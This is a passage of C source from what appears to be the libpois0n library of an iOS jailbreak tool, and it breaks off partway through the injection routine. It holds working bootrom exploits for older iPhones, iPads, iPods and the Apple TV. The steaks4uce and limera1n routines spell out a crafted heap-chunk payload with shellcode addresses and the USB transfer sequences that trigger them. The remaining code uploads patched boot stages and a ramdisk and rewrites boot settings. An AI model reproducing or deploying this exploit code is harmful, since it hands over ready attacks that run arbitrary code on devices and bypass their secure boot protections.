#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include "libpois0n.h"
#include "libpartial.h"
#include "libirecovery.h"

//#define SHATTER
#define LIMERA1N
#define STEAKS4UCE

#ifdef SHATTER
#include "shatter.h"
#endif

#ifdef LIMERA1N
#include "limera1n.h"
#endif

#ifdef STEAKS4UCE
#include "steaks4uce.h"
#endif

#include "ramdisk.h"
#include "payloads/iBSS.k66ap.h"
#include "payloads/iBSS.k48ap.h"
#include "payloads/iBSS.n88ap.h"
#include "payloads/iBSS.n90ap.h"
#include "payloads/iBSS.n72ap.h"
#include "payloads/iBSS.n18ap.h"
#include "payloads/iBSS.n81ap.h"
#include "payloads/iBoot.k66ap.h"
#include "payloads/iBoot.k48ap.h"
#include "payloads/iBoot.n88ap.h"
#include "payloads/iBoot.n90ap.h"
#include "payloads/iBoot.n72ap.h"
#include "payloads/iBoot.n18ap.h"
#include "payloads/iBoot.n81ap.h"

int libpois0n_debug = 1;
static irecv_client_t client = NULL;
static irecv_device_t device = NULL;
static pois0n_callback progress_callback = NULL;
static void* user_object = NULL;

int recovery_callback(irecv_client_t client, const irecv_event_t* event) {
	progress_callback(event->progress, user_object);
	return 0;
}

void download_callback(ZipInfo* info, CDFile* file, size_t progress) {
	double value = ((double) progress * 100.0);
	progress_callback(value, user_object);
}

#ifdef SHATTER
int receive_data(int bytes) {
	char* buffer = NULL;
	irecv_error_t error = 0;

	buffer = (char*) malloc(bytes);
	if(buffer == NULL) {
		error("Out of memory\n");
		return -1;
	}

	error = irecv_recv_buffer(client, buffer, bytes);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		free(buffer);
		return -1;
	}

	free(buffer);
	return 0;
}
#endif

int fetch_image(const char* path, const char* output) {
	debug("Fetching %s...\n", path);
	if(download_file_from_zip(device->url, path, output, &download_callback) != 0) {
		error("Unable to fetch %s\n", path);
		return -1;
	}
	
	return 0;
}

int fetch_dfu_image(const char* type, const char* output) {
	char name[64];
	char path[255];

	memset(name, '\0', 64);
	memset(path, '\0', 255);
	snprintf(name, 63, "%s.%s.RELEASE.dfu", type, device->model);
	snprintf(path, 254, "Firmware/dfu/%s", name);

	debug("Preparing to fetch DFU image from Apple's servers\n");
	if(fetch_image(path, output)  < 0) {
		error("Unable to fetch DFU image from Apple's servers\n");
		return -1;
	}

	return 0;
}

int fetch_firmware_image(const char* type, const char* output) {
	char name[64];
	char path[255];

	memset(name, '\0', 64);
	memset(path, '\0', 255);
	snprintf(name, 63, "%s.%s.img3", type, device->model);
	snprintf(path, 254, "Firmware/all_flash/all_flash.%s.production/%s", device->model, name);

	debug("Preparing to fetch firmware image from Apple's servers\n");
	if(fetch_image(path, output)  < 0) {
		error("Unable to fetch firmware image from Apple's servers\n");
	}

	return 0;
}

int upload_dfu_image(const char* type) {
	char image[255];
	struct stat buf;
	irecv_error_t error = 0;

	memset(image, '\0', 255);
	snprintf(image, 254, "%s.%s", type, device->model);

	debug("Checking if %s already exists\n", image);
	//if(stat(image, &buf) != 0) {
		if(fetch_dfu_image(type, image) < 0) {
			error("Unable to upload DFU image\n");
			return -1;
		}
	//}

	if(client->mode != kDfuMode) {
		debug("Resetting device counters\n");
		error = irecv_reset_counters(client);
		if (error != IRECV_E_SUCCESS) {
			debug("%s\n", irecv_strerror(error));
			return -1;
		}
	}

	debug("Uploading %s to device\n", image);
	error = irecv_send_file(client, image, 1);
	if(error != IRECV_E_SUCCESS) {
		debug("%s\n", irecv_strerror(error));
		return -1;
	}
	return 0;
}

int upload_firmware_image(const char* type) {
	char image[255];
	struct stat buf;
	irecv_error_t error = 0;

	memset(image, '\0', 255);
	snprintf(image, 254, "%s.%s", type, device->model);

	debug("Checking if %s already exists\n", image);
	//if(stat(image, &buf) != 0) {
		if(fetch_firmware_image(type, image) < 0) {
			error("Unable to upload firmware image\n");
			return -1;
		}
	//}

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("Unable to upload firmware image\n");
		debug("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Uploading %s to device\n", image);
	error = irecv_send_file(client, image, 1);
	if(error != IRECV_E_SUCCESS) {
		error("Unable to upload firmware image\n");
		debug("%s\n", irecv_strerror(error));
		return -1;
	}
}

int upload_firmware_payload(char* type) {
	int size = 0;
	char* payload = NULL;
	irecv_error_t error = 0;

	switch(device->index) {
	case DEVICE_APPLETV2:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_k66ap;
			size = sizeof(iBSS_k66ap);
			debug("Loaded payload for iBSS on k66ap\n0");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_k66ap;
			//size = sizeof(iBEC_k66ap);
			debug("Loaded payload for iBEC on k66ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_k66ap;
			size = sizeof(iBoot_k66ap);
			debug("Loaded payload for iBoot on k66ap\n");
		}
		break;

	case DEVICE_IPAD1G:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_k48ap;
			size = sizeof(iBSS_k48ap);
			debug("Loaded payload for iBSS on k48ap\n0");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_k48ap;
			//size = sizeof(iBEC_k48ap);
			debug("Loaded payload for iBEC on k48ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_k48ap;
			size = sizeof(iBoot_k48ap);
			debug("Loaded payload for iBoot on k48ap\n");
		}
		break;
	
	case DEVICE_IPHONE3GS:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_n88ap;
			size = sizeof(iBSS_n88ap);
			debug("Loaded payload for iBSS on n88ap\n");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_n88ap;
			//size = sizeof(iBEC_n88ap);
			debug("Loaded payload for iBEC on n88ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_n88ap;
			size = sizeof(iBoot_n88ap);
			debug("Loaded payload for iBoot on n88ap\n");
		}
		break;

	case DEVICE_IPHONE4:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_n90ap;
			size = sizeof(iBSS_n90ap);
			debug("Loaded payload for iBSS on n90ap\n");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_n90ap;
			//size = sizeof(iBEC_n90ap);
			debug("Loaded payload for iBEC on n90ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_n90ap;
			size = sizeof(iBoot_n90ap);
			debug("Loaded payload for iBoot on n90ap\n");
		}
		break;

	case DEVICE_IPOD2G:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_n72ap;
			size = sizeof(iBSS_n72ap);
			debug("Loaded payload for iBSS on n72ap\n");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_n72ap;
			//size = sizeof(iBEC_n72ap);
			debug("Loaded payload for iBEC on n72ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_n72ap;
			size = sizeof(iBoot_n72ap);
			debug("Loaded payload for iBoot on n72ap\n");
		}
		break;

	case DEVICE_IPOD3G:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_n18ap;
			size = sizeof(iBSS_n18ap);
			debug("Loaded payload for iBSS on n18ap\n");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_n18ap;
			//size = sizeof(iBEC_n18ap);
			debug("Loaded payload for iBEC on n18ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_n18ap;
			size = sizeof(iBoot_n18ap);
			debug("Loaded payload for iBoot on n18ap\n");
		}
		break;

	case DEVICE_IPOD4G:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_n81ap;
			size = sizeof(iBSS_n81ap);
			debug("Loaded payload for iBSS on n81ap\n");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_n81ap;
			//size = sizeof(iBEC_n81ap);
			debug("Loaded payload for iBEC on n81ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_n81ap;
			size = sizeof(iBoot_n81ap);
			debug("Loaded payload for iBoot on n81ap\n");
		}
		break;
	}

	if(payload == NULL) {
		error("Unable to upload firmware payload\n");
		return -1;
	}

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("Unable to upload firmware payload\n");
		debug("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Uploading %s payload\n", type);
	error = irecv_send_buffer(client, (unsigned char*) payload, size, 1);
	if(error != IRECV_E_SUCCESS) {
		error("Unable to upload %s payload\n", type);
		return -1;
	}

	return 0;
}

#ifdef STEAKS4UCE
int steaks4uce_exploit() {
	irecv_error_t error = 0;
	int i, ret;
	unsigned char data[0x800];
	unsigned char payload[] = {
				/* free'd buffer dlmalloc header: */
				0x84, 0x00, 0x00, 0x00, // 0x00: previous_chunk
				0x05, 0x00, 0x00, 0x00, // 0x04: next_chunk
				/* free'd buffer contents: (malloc'd size=0x1C, real size=0x20, see sub_9C8) */
				0x80, 0x00, 0x00, 0x00, // 0x08: (0x00) direction
				0x80, 0x62, 0x02, 0x22, // 0x0c: (0x04) usb_response_buffer
				0xff, 0xff, 0xff, 0xff, // 0x10: (0x08)
				0x00, 0x00, 0x00, 0x00, // 0x14: (0x0c) data size (filled by the code just after)
				0x00, 0x01, 0x00, 0x00, // 0x18: (0x10)
				0x00, 0x00, 0x00, 0x00, // 0x1c: (0x14)
				0x00, 0x00, 0x00, 0x00, // 0x20: (0x18)
				0x00, 0x00, 0x00, 0x00, // 0x24: (0x1c)
				/* attack dlmalloc header: */
				0x15, 0x00, 0x00, 0x00, // 0x28: previous_chunk
				0x02, 0x00, 0x00, 0x00, // 0x2c: next_chunk : 0x2 choosed randomly :-)
				0x01, 0x38, 0x02, 0x22, // 0x30: FD : shellcode_thumb_start()
				//0x90, 0xd7, 0x02, 0x22, // 0x34: BK : free() LR in stack
				0xfc, 0xd7, 0x02, 0x22, // 0x34: BK : exception_irq() LR in stack
				};

	info("Executing steaks4uce exploit ...\n");
	debug("Reseting usb counters.\n");
	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
	if (ret < 0) {
		error("Failed to reset usb counters.\n");
		return -1;
	}

	debug("Padding to 0x23800...\n");
	memset(data, 0, 0x800);
	for(i = 0; i < 0x23800 ; i+=0x800)  {
		ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
		if (ret < 0) {
			error("Failed to push data to the device.\n");
			return -1;
		}
	}
	debug("Uploading shellcode.\n");
	memset(data, 0, 0x800);
	memcpy(data, steaks4uce, sizeof(steaks4uce));
	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
	if (ret < 0) {
		error("Failed to upload shellcode.\n");
		return -1;
	}

	debug("Reseting usb counters.\n");
	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
	if (ret < 0) {
		error("Failed to reset usb counters.\n");
		return -1;
	}

	int send_size = 0x100 + sizeof(payload);
	*((unsigned int*) &payload[0x14]) = send_size;
	memset(data, 0, 0x800);
	memcpy(&data[0x100], payload, sizeof(payload));

	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size , 1000);
	if (ret < 0) {
		error("Failed to send steaks4uce to the device.\n");
		return -1;
	}
	ret = irecv_control_transfer(client, 0xA1, 1, 0, 0, data, send_size , 1000);
	if (ret < 0) {
		error("Failed to execute steaks4uce.\n");
		return -1;
	}
	info("steaks4uce sent & executed successfully.\n");

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		debug("%s\n", irecv_strerror(error));
		error("Unable to reconnect\n");
		return -1;
	}

	return 0;
}
#endif

#ifdef LIMERA1N
int limera1n_exploit() {
	irecv_error_t error = 0;
	unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = 0x24000;
	unsigned int load_address = 0x84000000;
	unsigned int stack_address = 0x84033F98;
	unsigned int shellcode_address = 0x84023001;
	unsigned int shellcode_length = 0;


	if (device->chip_id == 8930) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	}
	if (device->chip_id == 8920) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	}

	memset(shellcode, 0x0, 0x800);
	shellcode_length = sizeof(limera1n);
	memcpy(shellcode, limera1n, sizeof(limera1n));
	
	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < 0x800; i += 0x40) {
		unsigned int* heap = (unsigned int*)(buf+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}

	debug("Sending chunk headers\n");
	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);

	memset(buf, 0xCC, 0x800);
	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}

	debug("Sending exploit payload\n");
	irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

	debug("Sending fake data\n");
	memset(buf, 0xBB, 0x800);
	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);

	//debug("Executing exploit\n");
	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);

	irecv_reset(client);
	irecv_finish_transfer(client);
	debug("Exploit sent\n");

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		debug("%s\n", irecv_strerror(error));
		error("Unable to reconnect\n");
		return -1;
	}

	return 0;
}
#endif

#ifdef SHATTER
int shatter_exploit() {
	irecv_error_t error = 0;

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Shifting upload pointer\n");
	if(receive_data(0x80)) {
		error("Unable to shift upload counter\n");
		return -1;
	}

	debug("Resetting device\n");
	irecv_reset(client);

	debug("Finishing shift transaction\n");
	error = irecv_finish_transfer(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		error("Unable to reconnect to device\n");
		return -1;
	}

	debug("Overwriting SHA1 registers\n");
	if(receive_data(0x2C000)) {
		error("Unable to overwrite SHA1 registers\n");
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		error("Unable to reconnect to device\n");
		return -1;
	}

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Shifting upload pointer\n");
	if(receive_data(0x140)) {
		error("Unable to shift upload counter\n");
		return -1;
	}

	debug("Resetting device\n");
	irecv_reset(client);

	debug("Finishing shift transaction\n");
	error = irecv_finish_transfer(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		error("Unable to reconnect to device\n");
		return -1;
	}

	debug("Sending exploit data\n");
	error = irecv_send_buffer(client, (unsigned char*) shatter, sizeof(shatter), 0);
	if(error != IRECV_E_SUCCESS) {
		error("Unable to send exploit data\n");
		return -1;
	}

	debug("Forcing prefetch abort exception\n");
	if(receive_data(0x2C000)) {
		error("Unable to force prefetch abort exception\n");
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		debug("%s\n", irecv_strerror(error));
		error("Unable to reconnect\n");
		return -1;
	}

	return 0;
}
#endif

int upload_ibss() {
	if(upload_dfu_image("iBSS") < 0) {
		error("Unable upload iBSS\n");
		return -1;
	}
	return 0;
}

int upload_iboot() {
	if(upload_firmware_image("iBoot") < 0) {
		error("Unable upload iBoot\n");
		return -1;
	}
	return 0;
}

int upload_devicetree() {
	if(upload_firmware_image("DeviceTree") < 0) {
		error("Unable upload DeviceTree\n");
		return -1;
	}
	return 0;
}

int upload_ramdisk() {
	if(irecv_send_buffer(client, (unsigned char*) ramdisk, sizeof(ramdisk), 0) < 0) {
		error("Unable upload ramdisk\n");
		return -1;
	}
	return 0;
}

int upload_kernelcache() {
	struct stat buf;
	char kernelcache[255];
	irecv_error_t error = 0;

	memset(kernelcache, '\0', 255);
	memset(&buf, '\0', sizeof(buf));
	snprintf(kernelcache, 254, "kernelcache.release.%c%c%c", device->model[0], device->model[1], device->model[2]);
	debug("Checking if kernelcache already exists\n");
	//if(stat(kernelcache, &buf) != 0) {
		if(fetch_image(kernelcache, kernelcache) < 0) {
			error("Unable to upload kernelcache\n");
			return -1;
		}
	//}

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		debug("%s\n", irecv_strerror(error));
		error("Unable upload kernelcache\n");
		return -1;
	}

	error = irecv_send_file(client, kernelcache, 1);
	if(error != IRECV_E_SUCCESS) {
		debug("%s\n", irecv_strerror(error));
		error("Unable upload kernelcache\n");
		return -1;
	}

	return 0;
}

int upload_ibss_payload() {
	if(upload_firmware_payload("iBSS") < 0) {
		error("Unable to upload iBSS payload\n");
		return -1;
	}
	return 0;
}

int upload_ibec_payload() {
	if(upload_firmware_payload("iBEC") < 0) {
		error("Unable to upload iBEC payload\n");
		return -1;
	}
	return 0;
}

int boot_ramdisk() {
	irecv_error_t error = 0;

	debug("Loading iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go image load 0x69626F74 0x9000000");
	} else {
		error = irecv_send_command(client, "go image load 0x69626F74 0x41000000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable load iBoot to memory\n");
		return -1;
	}

	debug("Shifting iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go memory move 0x9000040 0x9000000 0x48000");
	} else {
		error = irecv_send_command(client, "go memory move 0x41000040 0x41000000 0x48000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to move iBoot into memory\n");
		return -1;
	}

	debug("Patching iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go patch 0x9000000 0x48000");
	} else {
		error = irecv_send_command(client, "go patch 0x41000000 0x48000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to patch iBoot\n");
		return -1;
	}

	irecv_setenv(client, "auto-boot", "false");
	irecv_saveenv(client);

	debug("Jumping into iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go jump 0x9000000");
	} else {
		error = irecv_send_command(client, "go jump 0x41000000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to jump into iBoot\n");
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 5);
	if (client == NULL) {
		error("Unable to boot the device tethered\n");
		return -1;
	}

	irecv_setenv(client, "auto-boot", "true");
	irecv_saveenv(client);

	if(upload_firmware_payload("iBoot") < 0) {
		error("Unable to boot the device tethered\n");
		return -1;
	}

	debug("Initializing greenpois0n in iBoot\n");
	irecv_send_command(client, "go");

	debug("Preparing to upload ramdisk\n");
	if(upload_ramdisk() < 0) {
		error("Unable to upload ramdisk\n");
		return -1;
	}

	debug("Executing ramdisk\n");
	error = irecv_send_command(client, "go ramdisk 1 1");
	if(error != IRECV_E_SUCCESS) {
		error("Unable to execute ramdisk command\n");
		return -1;
	}
/*
	debug("Decrypting ramdisk\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go image decrypt 0x9000000");
	} else {
		error = irecv_send_command(client, "go image decrypt 0x41000000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to decrypt ramdisk\n");
		return -1;
	}
*/
	debug("Moving ramdisk\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go memory move 0x9000040 0xC000000 0x100000");
	} else {
		error = irecv_send_command(client, "go memory move 0x41000040 0x44000000 0x100000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to move ramdisk\n");
		return -1;
	}

	debug("Setting kernel bootargs\n");
	error = irecv_send_command(client, "go kernel bootargs rd=md0 -v keepsyms=1");
	if(error != IRECV_E_SUCCESS) {
		error("Unable to set kernel bootargs\n");
		return -1;
	}

	//if(device->chip_id == 8720) {
		// This is a tethered jailbreak
		//irecv_setenv(client, "boot-args", "1");
		//irecv_setenv(client, "auto-boot", "false");
	//} else {
		// This is an untethered jailbreak
		irecv_setenv(client, "boot-args", "0");
		irecv_setenv(client, "auto-boot", "true");
	//}
	irecv_saveenv(client);

	error = irecv_send_command(client, "go fsboot");
	if (error != IRECV_E_SUCCESS) {
		error("Unable to fsboot\n");
		return -1;
	}

	return 0;
}

int boot_tethered() {
	irecv_error_t error = 0;

	debug("Loading iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go image load 0x69626F74 0x9000000");
	} else {
		error = irecv_send_command(client, "go image load 0x69626F74 0x41000000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to load iBoot to memory\n");
		return -1;
	}

	debug("Shifting iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go memory move 0x9000040 0x9000000 0x48000");
	} else {
		error = irecv_send_command(client, "go memory move 0x41000040 0x41000000 0x48000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to move iBoot into memory\n");
		return -1;
	}

	debug("Patching iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go patch 0x9000000 0x48000");
	} else {
		error = irecv_send_command(client, "go patch 0x41000000 0x48000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to patch iBoot\n");
		return -1;
	}

	irecv_setenv(client, "auto-boot", "false");
	irecv_saveenv(client);

	debug("Jumping into iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go jump 0x9000000");
	} else {
		error = irecv_send_command(client, "go jump 0x41000000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to jump into iBoot\n");
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 10);
	if (client == NULL) {
		error("Unable to boot the device tethered\n");
		return -1;
	}

	irecv_setenv(client, "auto-boot", "true");
	irecv_saveenv(client);

	if(upload_firmware_payload("iBoot") < 0) {
		error("Unable to boot the device tethered\n");
		return -1;
	}

	debug("Initializing greenpois0n in iBoot\n");
	irecv_send_command(client, "go");

	debug("Preparing to upload ramdisk\n");
	if(upload_ramdisk() < 0) {
		error("Unable to upload ramdisk\n");
		return -1;
	}

	debug("Executing ramdisk\n");
	error = irecv_send_command(client, "go ramdisk 1 1");
	if(error != IRECV_E_SUCCESS) {
		error("Unable to execute ramdisk command\n");
		return -1;
	}
/*
	debug("Decrypting ramdisk\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go image decrypt 0x9000000");
	} else {
		error = irecv_send_command(client, "go image decrypt 0x41000000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to decrypt ramdisk\n");
		return -1;
	}
*/
	debug("Moving ramdisk\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go memory move 0x9000040 0xC000000 0x100000");
	} else {
		error = irecv_send_command(client, "go memory move 0x41000040 0x44000000 0x100000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to move ramdisk\n");
		return -1;
	}

	debug("Setting kernel bootargs\n");
	error = irecv_send_command(client, "go kernel bootargs rd=disk0s1 -v keepsyms=1");
	if(error != IRECV_E_SUCCESS) {
		error("Unable to set kernel bootargs\n");
		return -1;
	}

	//if(device->chip_id == 8720) {
		// This is a tethered jailbreak
		//irecv_setenv(client, "boot-args", "1");
		//irecv_setenv(client, "auto-boot", "false");
	//} else {
		// This is an untethered jailbreak
		irecv_setenv(client, "boot-args", "0");
		irecv_setenv(client, "auto-boot", "true");
	//}
	irecv_saveenv(client);

	error = irecv_send_command(client, "go fsboot");
	if (error != IRECV_E_SUCCESS) {
		error("Unable to fsboot\n");
		return -1;
	}

	return 0;
}

int boot_iboot() {
	irecv_error_t error = 0;

	debug("Loading iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go image load 0x69626F74 0x9000000");
	} else {
		error = irecv_send_command(client, "go image load 0x69626F74 0x41000000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable load iBoot to memory\n");
		return -1;
	}

	debug("Shifting iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go memory move 0x9000040 0x9000000 0x48000");
	} else {
		error = irecv_send_command(client, "go memory move 0x41000040 0x41000000 0x48000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to move iBoot into memory\n");
		return -1;
	}

	debug("Patching iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go patch 0x9000000 0x48000");
	} else {
		error = irecv_send_command(client, "go patch 0x41000000 0x48000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to patch iBoot\n");
		return -1;
	}

	irecv_setenv(client, "auto-boot", "false");
	irecv_saveenv(client);

	debug("Jumping into iBoot\n");
	if(device->chip_id == 8720) {
		error = irecv_send_command(client, "go jump 0x9000000");
	} else {
		error = irecv_send_command(client, "go jump 0x41000000");
	}
	if(error != IRECV_E_SUCCESS) {
		error("Unable to jump into iBoot\n");
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 5);
	if (client == NULL) {
		error("Unable to boot the device tethered\n");
		return -1;
	}

	irecv_setenv(client, "auto-boot", "true");
	irecv_saveenv(client);

	if(upload_firmware_payload("iBoot") < 0) {
		error("Unable to boot the device tethered\n");
		return -1;
	}

	debug("Initializing greenpois0n in iBoot\n");
	irecv_send_command(client, "go");

	return 0;
}

int execute_ibss_payload() {
	int i = 0;
	char* bootargs = NULL;
	irecv_error_t error = 0;

	debug("Initializing greenpois0n in iBSS\n");
	irecv_send_command(client, "go");

	// Code to detect whether to boot ramdisk or filesystem
	debug("Checking if device is already jailbroken\n");
	error = irecv_getenv(client, "boot-args", &bootargs);
	if(error != IRECV_E_SUCCESS) {
		debug("%s\n", irecv_strerror(error));
		error("Unable to read env var\n");
		return -1;
	}

	// If boot-args hasn't been set then we've never been jailbroken
	if(!strcmp(bootargs, "") || !strcmp(bootargs, "0")) {
		debug("Booting jailbreak ramdisk\n");
		if(boot_ramdisk() < 0) {
			error("Unable to boot device into tethered mode\n");
			return -1;
		}
	}
	// If boot-args is 1 then boot device into tethered mode
	else if(!strcmp(bootargs, "1")) {
		debug("Booting tethered device\n");
		if(boot_tethered() < 0) {
			error("Unable to boot device into tethered mode\n");
			return -1;
		}
	}
	// If boot-args is 2, then don't boot kernel, just load iBSS payload
	else if(!strcmp(bootargs, "2")) {
		debug("Booting iBSS in payload mode\n");
		return 0;
	}
	// If boot-args is 3, then don't boot kernel, just load iBoot payload
	else if(!strcmp(bootargs, "3")) {
		debug("Booting device in verbose mode\n");
		if(boot_iboot() < 0) {
			error("Unable to boot device into verbose mode\n");
			return -1;
		}
	}

	return 0;
}

void pois0n_init() {
	irecv_init();
	irecv_set_debug_level(libpois0n_debug);
	debug("Initializing libpois0n\n");
	#ifdef __APPLE__
		system("killall -9 iTunesHelper");
	#endif

	#ifdef WIN32
		system("TASKKILL /F /IM iTunes.exe > NUL");
		system("TASKKILL /F /IM iTunesHelper.exe > NUL");
	#endif
}

void pois0n_set_callback(pois0n_callback callback, void* object) {
	progress_callback = callback;
	user_object = object;
}

int pois0n_is_ready() {
	irecv_error_t error = 0;

	//////////////////////////////////////
	// Begin
	// debug("Connecting to device\n");
	error = irecv_open(&client);
	if (error != IRECV_E_SUCCESS) {
		debug("Device must be in DFU mode to continue\n");
		return -1;
	}
	irecv_event_subscribe(client, IRECV_PROGRESS, &recovery_callback, NULL);

	//////////////////////////////////////
	// Check device
	// debug("Checking the device mode\n");
	if (client->mode != kDfuMode) {
		error("Device must be in DFU mode to continue\n");
		irecv_close(client);
		return -1;
	}

	return 0;
}

int pois0n_is_compatible() {
	irecv_error_t error = 0;
	info("Checking if device is compatible with this jailbreak\n");

	debug("Checking the device type\n");
	error = irecv_get_device(client, &device);
	if (device == NULL || device->index == DEVICE_UNKNOWN) {
		error("Sorry device is not compatible with this jailbreak\n");
		return -1;
	}
	info("Identified device as %s\n", device->product);

	if (device->chip_id != 8930
#ifdef LIMERA1N
			&& device->chip_id != 8922
			&& device->chip_id != 8920
#endif
#ifdef STEAKS4UCE
			&& device->chip_id != 8720
#endif
			) {
		error("Sorry device is not compatible with this jailbreak\n");
		return -1;
	}

	return 0;
}

void pois0n_exit() {
	debug("Exiting libpois0n\n");
	irecv_close(client);
	irecv_exit();
}

int pois0n_inject() {
	//////////////////////////////////////
	// Send exploit
	if(device->chip_id == 8930){
#ifdef SHATTER
		debug("Preparing to upload SHAtter exploit\n");
		if(shatter_exploit() < 0) {
			error("Unable to upload exploit data\n");
			return -1;
		}
#else
		debug("Preparing to upload limera1n exploit\n");
		if(limera1n_exploit() < 0) {
			error("Unable to upload exploit data\n");
			return -1;
		}
#endif
	}
	else if(device->chip_id == 8920 || device->chip_id == 8922) {
#ifdef LIMERA1N
		debug("Preparing to upload limera1n exploit\n");
		if(limera1n_exploit() < 0) {
			error("Unable to upload exploit data\n");
			return -1;
		}
#endif
	}
	else if(device->chip_id == 8720) {
#ifdef STEAKS4UCE
